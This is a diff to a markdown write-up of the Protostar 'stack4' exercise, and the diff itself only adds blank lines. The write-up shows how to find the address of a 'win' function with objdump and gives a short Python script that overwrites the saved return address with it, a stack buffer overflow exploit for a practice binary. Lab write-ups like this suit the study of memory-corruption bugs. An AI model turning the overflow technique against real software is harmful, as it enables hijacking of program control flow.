@@ -44,6 +44,7 @@ info registers
 - Run `objdump -t stack4` and find win `objdump -t stack4 | grep win`
   - `win` is at `080483f4`
 - We have to control these so change the code like:  
+
 ```python
 import struct
 
@@ -52,6 +53,7 @@ ebp = 'AAAA' # ebp - junk
 eip = struct.pack('I', 0x080483f4) # eip
 print padding+ebp+eip
 ```
+
 - We have to create a file from the code output now then run in gdb  
 `python stack4_2.py > stack4_2_exp`  
 ![pwned](pwned.png)
